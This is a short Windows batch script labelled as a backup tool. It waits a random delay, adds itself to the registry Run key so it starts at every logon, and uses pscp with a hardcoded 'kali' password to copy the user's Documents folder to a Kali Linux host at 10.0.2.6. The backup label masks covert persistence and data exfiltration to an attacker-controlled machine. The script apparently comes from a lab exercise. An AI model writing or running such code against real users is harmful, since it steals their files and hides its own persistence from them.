@echo off

:GenerateRandomDelay
set /a "randomDelay=%random% %% 120"
if %randomDelay% lss 1 goto GenerateRandomDelay

timeout /t %randomDelay% /nobreak >nul

set "localFolder=%USERPROFILE%\Documents"
set "serverAddress=kali@10.0.2.6:/home/kali/Backups"
set "password=kali"

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "backup.bat" /t REG_SZ /d "\"%~dp0%~nx0\"" /f

pscp -r -pw %password% "%localFolder%" "%serverAddress%"e
